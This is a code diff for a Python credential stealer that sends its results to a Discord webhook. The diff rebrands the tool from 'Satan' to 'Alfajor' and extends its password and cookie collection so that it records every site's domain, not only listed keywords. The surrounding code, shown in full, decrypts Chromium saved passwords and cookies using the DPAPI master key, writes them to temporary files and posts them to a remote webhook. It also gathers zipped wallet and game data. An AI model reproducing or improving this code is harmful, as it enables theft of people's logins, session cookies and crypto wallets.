@@ -326,7 +326,7 @@ def uploadToken(token, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "Satan ",
+                "text": "Alfajor ",
                 "icon_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
                 },
             "thumbnail": {
@@ -335,7 +335,7 @@ def uploadToken(token, path):
             }
         ],
         "avatar_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp",
-        "username": "Satan ",
+        "username": "Alfajor ",
         "attachments": []
         }
     urlopen(Request(hook, data=dumps(data).encode(), headers=headers))
@@ -363,16 +363,16 @@ def upload(name, link):
             "content": globalInfo(),
             "embeds": [
                 {
-                    "title": "Satan | Cookies",
-                    "description": f"**Found**:\n{rb}\n\n**Data:**\n <:bl_skull:937798683368505364> • **{CookiCount}** Cookies Found\n <a:LV1:1042397877722423368> • [SatanCookies.txt]({link})",
+                    "title": "Alfajor | Cookies",
+                    "description": f"**Found**:\n{rb}\n\n**Data:**\n <:bl_skull:937798683368505364> • **{CookiCount}** Cookies Found\n <a:LV1:1042397877722423368> • [AlfajorCookies.txt]({link})",
                     "color": 2895667,
                     "footer": {
-                        "text": "Satan",
+                        "text": "Alfajor",
                         "icon_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
                     }
                 }
             ],
-            "username": "Satan",
+            "username": "Alfajor",
             "avatar_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp",
             "attachments": []
             }
@@ -390,16 +390,16 @@ def upload(name, link):
             "content": globalInfo(),
             "embeds": [
                 {
-                    "title": "Satan | Password ",
-                    "description": f"**Found**:\n{ra}\n\n**Data:**\n <a:crspookylaugh:886385706975510538> • **{PasswCount}** Passwords Found\n <a:LV1:1042397877722423368> • [SatanPasswords.txt]({link})",
+                    "title": "Alfajor | Password ",
+                    "description": f"**Found**:\n{ra}\n\n**Data:**\n <a:crspookylaugh:886385706975510538> • **{PasswCount}** Passwords Found\n <a:LV1:1042397877722423368> • [AlfajorPasswords.txt]({link})",
                     "color": 2895667,
                     "footer": {
-                        "text": "Satan ",
+                        "text": "Alfajor ",
                         "icon_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
                     }
                 }
             ],
-            "username": "Satan ",
+            "username": "Alfajor ",
             "avatar_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp",
             "attachments": []
             }
@@ -420,15 +420,15 @@ def upload(name, link):
                     }
                 ],
                 "author": {
-                    "name": "Satan | File "
+                    "name": "Alfajor | File "
                 },
                 "footer": {
-                    "text": "Satan ",
+                    "text": "Alfajor ",
                     "icon_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
                 }
                 }
             ],
-            "username": "Satan ",
+            "username": "Alfajor ",
             "avatar_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp",
             "attachments": []
             }
@@ -450,7 +450,7 @@ def upload(name, link):
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
     with open(path, mode='w', encoding='utf-8') as f:
-        f.write(f"<--Satan  ON TOP-->\n\n")
+        f.write(f"<--Alfajor  ON TOP-->\n\n")
         for line in data:
             if line[0] != '':
                 f.write(f"{line}\n")
@@ -496,8 +496,9 @@ def getPassw(path, arg):
     master_key = b64decode(local_state['os_crypt']['encrypted_key'])
     master_key = CryptUnprotectData(master_key[5:])
 
-    for row in data: 
+    for row in data:
         if row[0] != '':
+            matched = False
             for wa in keyword:
                 old = wa
                 if "https" in wa:
@@ -505,6 +506,10 @@ def getPassw(path, arg):
                     wa = tmp.split('[')[1].split(']')[0]
                 if wa in row[0]:
                     if not old in paswWords: paswWords.append(old)
+                    matched = True
+            if not matched:
+                domain = row[0].split('/')[2] if '/' in row[0] else row[0]
+                if not domain in paswWords: paswWords.append(domain)
             Passw.append(f"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {DecryptValue(row[2], master_key)}")
             PasswCount += 1
     writeforfile(Passw, 'passw')
@@ -534,8 +539,9 @@ def getCookie(path, arg):
     master_key = b64decode(local_state['os_crypt']['encrypted_key'])
     master_key = CryptUnprotectData(master_key[5:])
 
-    for row in data: 
+    for row in data:
         if row[0] != '':
+            matched = False
             for wa in keyword:
                 old = wa
                 if "https" in wa:
@@ -543,6 +549,10 @@ def getCookie(path, arg):
                     wa = tmp.split('[')[1].split(']')[0]
                 if wa in row[0]:
                     if not old in cookiWords: cookiWords.append(old)
+                    matched = True
+            if not matched:
+                domain = row[0].lstrip('.')
+                if not domain in cookiWords: cookiWords.append(domain)
             Cookies.append(f"{row[0]}	TRUE	/	FALSE	2597573456	{row[1]}	{DecryptValue(row[2], master_key)}")
             CookiCount += 1
     writeforfile(Cookies, 'cook')
@@ -615,16 +625,16 @@ def GatherZips(paths1, paths2, paths3):
         "content": globalInfo(),
         "embeds": [
             {
-            "title": "Satan Zips",
+            "title": "Alfajor Zips",
             "description": f"{wal}\n{ga}\n{ot}",
             "color": 2895667,
             "footer": {
-                "text": "Satan ",
+                "text": "Alfajor ",
                 "icon_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp"
             }
             }
         ],
-        "username": "Satan ",
+        "username": "Alfajor ",
         "avatar_url": "https://cdn.discordapp.com/icons/1008591787788603393/362ebc1b96a9a0f7a1a59c5b17275bdb.webp",
         "attachments": []
     }
